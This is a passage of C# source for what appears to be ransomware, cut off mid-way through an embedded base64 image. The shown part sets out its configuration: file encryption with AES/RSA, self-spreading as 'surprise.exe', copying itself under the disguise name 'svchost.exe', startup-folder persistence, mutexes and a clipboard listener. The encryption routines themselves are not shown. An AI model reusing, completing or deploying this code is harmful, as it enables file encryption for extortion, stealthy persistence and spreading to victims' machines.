using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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